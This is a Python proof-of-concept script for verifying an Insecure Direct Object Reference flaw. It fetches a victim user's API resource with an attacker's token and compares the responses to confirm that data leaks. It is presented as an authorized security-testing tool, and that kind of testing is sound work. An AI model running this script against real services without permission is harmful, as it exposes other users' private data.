#!/usr/bin/env python3
"""
PoC: Insecure Direct Object Reference (IDOR) - VULN-IDOR-001

Vulnerability:
    Insecure Direct Object References occur when an application exposes
    internal object identifiers (e.g., database IDs, filenames) in URLs or
    parameters without proper authorization checks. An attacker can manipulate
    these references to access resources belonging to other users.

Test methodology:
    1. Authenticate as User A (victim) and fetch a resource, recording its ID.
    2. Authenticate as User B (attacker) and attempt to access User A's
       resource using the captured ID.
    3. If User B receives User A's data, the IDOR vulnerability is confirmed.

Usage:
    python poc_idor_001.py --target http://localhost:8080 \\
        --token-a "Bearer victim_token" --token-b "Bearer attacker_token" \\
        --resource-path "/api/users/{id}/profile" --victim-id 1001

Exit codes:
    0 = CONFIRMED  (unauthorized access succeeded)
    1 = NOT_REPRODUCED  (access was properly denied)
    2 = ERROR  (script encountered an error)

AUTHORIZED SECURITY TESTING ONLY.
"""

import argparse
import json
import sys
import time

try:
    import requests
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False


def parse_args():
    parser = argparse.ArgumentParser(
        description="PoC for IDOR vulnerability testing (VULN-IDOR-001)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="AUTHORIZED SECURITY TESTING ONLY.",
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8080",
        help="Base URL of the target application (default: http://localhost:8080)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=30,
        help="Request timeout in seconds (default: 30)",
    )
    parser.add_argument(
        "--token-a",
        default="Bearer user_a_token",
        help="Authorization token for User A (victim)",
    )
    parser.add_argument(
        "--token-b",
        default="Bearer user_b_token",
        help="Authorization token for User B (attacker)",
    )
    parser.add_argument(
        "--resource-path",
        default="/api/users/{id}/profile",
        help="API path template with {id} placeholder (default: /api/users/{id}/profile)",
    )
    parser.add_argument(
        "--victim-id",
        default="1001",
        help="Resource ID belonging to User A (default: 1001)",
    )
    parser.add_argument(
        "--attacker-id",
        default="1002",
        help="Resource ID belonging to User B (default: 1002)",
    )
    return parser.parse_args()


def make_request(base_url, path, token, timeout):
    """Send an authenticated GET request and return the response."""
    url = f"{base_url.rstrip('/')}{path}"
    headers = {
        "Authorization": token,
        "Accept": "application/json",
        "User-Agent": "VulnAnalysis-PoC/1.0",
    }
    return requests.get(url, headers=headers, timeout=timeout, allow_redirects=False)


def test_idor(args):
    """
    Execute the IDOR test sequence.

    Returns:
        tuple: (result_code, message)
            result_code: 0=CONFIRMED, 1=NOT_REPRODUCED, 2=ERROR
    """
    vuln_id = "VULN-IDOR-001"
    target = args.target.rstrip("/")
    victim_path = args.resource_path.replace("{id}", str(args.victim_id))
    attacker_own_path = args.resource_path.replace("{id}", str(args.attacker_id))

    # -------------------------------------------------------------------------
    # Step 1: Verify User A can access their own resource (baseline check)
    # -------------------------------------------------------------------------
    print(f"[*] Step 1: Verifying User A can access their own resource...")
    print(f"    URL: {target}{victim_path}")

    try:
        resp_a = make_request(target, victim_path, args.token_a, args.timeout)
    except requests.ConnectionError as exc:
        return 2, f"[ERROR] {vuln_id}: Connection failed to {target} - {exc}"
    except requests.Timeout:
        return 2, f"[ERROR] {vuln_id}: Request timed out after {args.timeout}s"
    except requests.RequestException as exc:
        return 2, f"[ERROR] {vuln_id}: Request error - {exc}"

    if resp_a.status_code != 200:
        print(f"    User A received status {resp_a.status_code} for their own resource.")
        return 2, (
            f"[ERROR] {vuln_id}: Baseline check failed. User A cannot access their "
            f"own resource (HTTP {resp_a.status_code}). Verify tokens and target."
        )

    print(f"    User A access confirmed (HTTP {resp_a.status_code}).")

    # Capture a fingerprint of User A's data for comparison
    try:
        user_a_data = resp_a.json()
    except (json.JSONDecodeError, ValueError):
        user_a_data = resp_a.text
    user_a_fingerprint = resp_a.text[:500]

    # -------------------------------------------------------------------------
    # Step 2: Verify User B can access their OWN resource (auth works)
    # -------------------------------------------------------------------------
    print(f"\n[*] Step 2: Verifying User B can access their own resource...")
    print(f"    URL: {target}{attacker_own_path}")

    try:
        resp_b_own = make_request(target, attacker_own_path, args.token_b, args.timeout)
    except requests.RequestException as exc:
        return 2, f"[ERROR] {vuln_id}: Request error during User B self-check - {exc}"

    if resp_b_own.status_code != 200:
        print(f"    User B received status {resp_b_own.status_code} for their own resource.")
        return 2, (
            f"[ERROR] {vuln_id}: User B cannot access their own resource "
            f"(HTTP {resp_b_own.status_code}). Verify attacker token."
        )

    print(f"    User B self-access confirmed (HTTP {resp_b_own.status_code}).")

    # -------------------------------------------------------------------------
    # Step 3: User B attempts to access User A's resource (the IDOR test)
    # -------------------------------------------------------------------------
    print(f"\n[*] Step 3: User B attempting to access User A's resource...")
    print(f"    URL: {target}{victim_path}")
    print(f"    Auth: User B's token")

    try:
        resp_b_idor = make_request(target, victim_path, args.token_b, args.timeout)
    except requests.RequestException as exc:
        return 2, f"[ERROR] {vuln_id}: Request error during IDOR test - {exc}"

    print(f"    Response status: HTTP {resp_b_idor.status_code}")

    # -------------------------------------------------------------------------
    # Step 4: Analyze results
    # -------------------------------------------------------------------------
    print(f"\n[*] Step 4: Analyzing results...")

    # Case 1: Access denied (proper behavior)
    if resp_b_idor.status_code in (401, 403, 404):
        print(f"    Server returned {resp_b_idor.status_code} - access properly denied.")
        return 1, (
            f"[NOT_REPRODUCED] {vuln_id}: Server correctly denied User B access "
            f"to User A's resource (HTTP {resp_b_idor.status_code})."
        )

    # Case 2: Got a 200 response - check if it contains User A's data
    if resp_b_idor.status_code == 200:
        resp_b_idor_body = resp_b_idor.text[:500]

        # Check if response matches User A's data fingerprint
        if resp_b_idor_body == user_a_fingerprint:
            print("    IDOR CONFIRMED: User B received User A's exact data.")
            return 0, (
                f"[CONFIRMED] {vuln_id}: IDOR vulnerability confirmed. User B "
                f"successfully accessed User A's resource at {victim_path}. "
                f"Response body matches User A's data."
            )

        # Partial match - response is 200 but data differs
        # This could mean the server returned User B's own data or a generic response
        try:
            idor_data = resp_b_idor.json()
            if isinstance(idor_data, dict) and isinstance(user_a_data, dict):
                # Check for key data leakage indicators
                shared_keys = set(idor_data.keys()) & set(user_a_data.keys())
                matching_values = sum(
                    1 for k in shared_keys
                    if idor_data.get(k) == user_a_data.get(k)
                    and k not in ("status", "code", "message", "timestamp")
                )
                if matching_values > 0:
                    print(f"    PARTIAL IDOR: {matching_values} field(s) from User A leaked to User B.")
                    return 0, (
                        f"[CONFIRMED] {vuln_id}: Partial IDOR detected. User B received "
                        f"{matching_values} data field(s) belonging to User A."
                    )
        except (json.JSONDecodeError, ValueError, AttributeError):
            pass

        print("    HTTP 200 returned but data does not match User A's resource.")
        print("    The server may be returning User B's own data or a generic response.")
        return 1, (
            f"[PARTIAL] {vuln_id}: User B received HTTP 200 for User A's resource "
            f"path, but response content did not match User A's data. "
            f"Manual review recommended."
        )

    # Case 3: Unexpected status code
    print(f"    Unexpected status code: {resp_b_idor.status_code}")
    return 1, (
        f"[NOT_REPRODUCED] {vuln_id}: Unexpected response "
        f"(HTTP {resp_b_idor.status_code}). Manual review may be needed."
    )


def main():
    args = parse_args()

    if not _HAS_REQUESTS:
        print("[ERROR] VULN-IDOR-001: 'requests' library is required. "
              "Install with: pip install requests")
        sys.exit(2)

    print("=" * 70)
    print("  PoC: Insecure Direct Object Reference (IDOR)")
    print("  Vulnerability ID: VULN-IDOR-001")
    print("=" * 70)
    print(f"  Target:       {args.target}")
    print(f"  Resource:     {args.resource_path}")
    print(f"  Victim ID:    {args.victim_id}")
    print(f"  Attacker ID:  {args.attacker_id}")
    print(f"  Timeout:      {args.timeout}s")
    print("=" * 70)
    print()

    start_time = time.monotonic()
    exit_code, message = test_idor(args)
    elapsed = time.monotonic() - start_time

    print()
    print("-" * 70)
    print(f"  Result: {message}")
    print(f"  Elapsed: {elapsed:.2f}s")
    print("-" * 70)

    sys.exit(exit_code)


if __name__ == "__main__":
    main()
